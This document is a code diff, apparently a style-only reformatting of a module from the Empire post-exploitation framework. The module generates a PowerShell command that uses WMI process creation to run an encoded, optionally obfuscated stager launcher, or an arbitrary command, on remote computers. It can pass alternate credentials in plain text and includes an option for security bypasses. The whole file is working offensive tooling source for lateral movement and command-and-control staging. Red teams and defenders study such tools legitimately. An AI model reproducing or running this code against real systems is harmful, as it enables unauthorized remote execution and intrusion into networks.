@@ -1,8 +1,7 @@
 from __future__ import print_function
 
 import pathlib
-from builtins import object
-from builtins import str
+from builtins import object, str
 from typing import Dict
 
 from empire.server.common import helpers
@@ -14,27 +13,35 @@ from empire.server.utils.module_util import handle_error_message
 
 class Module(object):
     @staticmethod
-    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
+    def generate(
+        main_menu,
+        module: PydanticModule,
+        params: Dict,
+        obfuscate: bool = False,
+        obfuscation_command: str = "",
+    ):
 
         # staging options
-        listener_name = params['Listener']
-        command = params['Command']
-        user_agent = params['UserAgent']
-        proxy = params['Proxy']
-        proxy_creds = params['ProxyCreds']
-        if (params['Obfuscate']).lower() == 'true':
+        listener_name = params["Listener"]
+        command = params["Command"]
+        user_agent = params["UserAgent"]
+        proxy = params["Proxy"]
+        proxy_creds = params["ProxyCreds"]
+        if (params["Obfuscate"]).lower() == "true":
             launcher_obfuscate = True
         else:
             launcher_obfuscate = False
-        launcher_obfuscate_command = params['ObfuscateCommand']
+        launcher_obfuscate_command = params["ObfuscateCommand"]
 
         script = """$null = Invoke-WmiMethod -Path Win32_process -Name create"""
 
         # Only "Command" or "Listener" but not both
-        if (listener_name == "" and command  == ""):
-          return handle_error_message("[!] Listener or Command required")
-        if (listener_name and command):
-          return handle_error_message("[!] Cannot use Listener and Command at the same time")
+        if listener_name == "" and command == "":
+            return handle_error_message("[!] Listener or Command required")
+        if listener_name and command:
+            return handle_error_message(
+                "[!] Cannot use Listener and Command at the same time"
+            )
 
         # if a credential ID is specified, try to parse
         cred_id = params["CredID"]
@@ -52,7 +59,6 @@ class Module(object):
             if cred.password != "":
                 params["Password"] = cred.password
 
-
         if not main_menu.listeners.is_listener_valid(listener_name) and not command:
             # not a valid listener, return nothing for the script
             return handle_error_message("[!] Invalid listener: " + listener_name)
@@ -60,37 +66,54 @@ class Module(object):
         elif listener_name:
 
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = main_menu.stagers.generate_launcher(listenerName=listener_name,
-                                                           language='powershell',
-                                                           encode=True,
-                                                           userAgent=user_agent,
-                                                           obfuscate=launcher_obfuscate,
-                                                           obfuscationCommand=launcher_obfuscate_command,
-                                                           proxy=proxy,
-                                                           proxyCreds=proxy_creds,
-                                                           bypasses=params['Bypasses'])
+            launcher = main_menu.stagers.generate_launcher(
+                listenerName=listener_name,
+                language="powershell",
+                encode=True,
+                userAgent=user_agent,
+                obfuscate=launcher_obfuscate,
+                obfuscationCommand=launcher_obfuscate_command,
+                proxy=proxy,
+                proxyCreds=proxy_creds,
+                bypasses=params["Bypasses"],
+            )
 
             if launcher == "":
                 return handle_error_message("[!] Error generating launcher")
             else:
-                stagerCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
+                stagerCode = (
+                    "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\" + launcher
+                )
 
         else:
-                Cmd = command.replace('"','`"').replace('$','`$')
-                stagerCode = Cmd
-                print(helpers.color("[*] Running command:  " + command))
+            Cmd = command.replace('"', '`"').replace("$", "`$")
+            stagerCode = Cmd
+            print(helpers.color("[*] Running command:  " + command))
 
         # build the WMI execution string
-        computer_names = "\"" + "\",\"".join(params['ComputerName'].split(",")) + "\""
+        computer_names = '"' + '","'.join(params["ComputerName"].split(",")) + '"'
 
-        script += " -ComputerName @("+computer_names+")"
-        script += " -ArgumentList \"" + stagerCode + "\""
+        script += " -ComputerName @(" + computer_names + ")"
+        script += ' -ArgumentList "' + stagerCode + '"'
 
         # if we're supplying alternate user credentials
-        if params["UserName"] != '':
-            script = "$PSPassword = \""+params["Password"]+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+params["UserName"]+"\",$PSPassword);" + script + " -Credential $Credential"
+        if params["UserName"] != "":
+            script = (
+                '$PSPassword = "'
+                + params["Password"]
+                + '" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential("'
+                + params["UserName"]
+                + '",$PSPassword);'
+                + script
+                + " -Credential $Credential"
+            )
 
-            script += ";'Invoke-Wmi executed on " +computer_names +"'"
+            script += ";'Invoke-Wmi executed on " + computer_names + "'"
 
-        script = main_menu.modules.finalize_module(script=script, script_end="", obfuscate=obfuscate, obfuscation_command=obfuscation_command)
+        script = main_menu.modules.finalize_module(
+            script=script,
+            script_end="",
+            obfuscate=obfuscate,
+            obfuscation_command=obfuscation_command,
+        )
         return script
